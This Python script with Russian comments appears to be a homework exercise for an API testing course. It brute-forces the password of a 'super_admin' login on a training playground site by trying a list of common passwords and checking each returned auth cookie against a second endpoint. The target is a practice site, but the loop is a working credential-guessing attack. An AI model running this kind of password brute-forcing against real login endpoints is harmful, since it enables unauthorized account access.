import requests

login = "super_admin"
#passwords = ["123456", "123456789", "12345", "qwerty", "password", "12345678", "111111", "123123", "1234567890", "1234567",
#             "qwerty123", "000000", "1q2w3e", "aa12345678", "abc123", "password1", "1234", "qwertyuiop", "123321", "password123"]
passwords = ["123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou", "111111", "123123",
             "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321", "555555", "lovely", "7777777", "welcome", "888888",
            "princess", "dragon", "password1", "123qwe"]
i = 0
for i in range (0, len(passwords), 1):
    #print(passwords[i])
    # Вызов 1-ого метода - В ответ метод будет возвращать авторизационную cookie с именем auth_cookie и каким-то значением
    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data={"login":login, "password":passwords[i]} )
    #print(response.status_code)
    #print(response.text)
    cookie_value = response.cookies.get('auth_cookie')
    #print(cookie_value)
    # Вызов 2-ого метода - эту cookie передаем во второй метод check_auth_cookie
    response2 = requests.post("https://playground.learnqa.ru/api/check_auth_cookie", cookies={'auth_cookie': cookie_value})
    if response2.text == "You are NOT authorized":
        continue
    else:
        print(f"Корректный пароль = {passwords[i]}, фраза = {response2.text}")
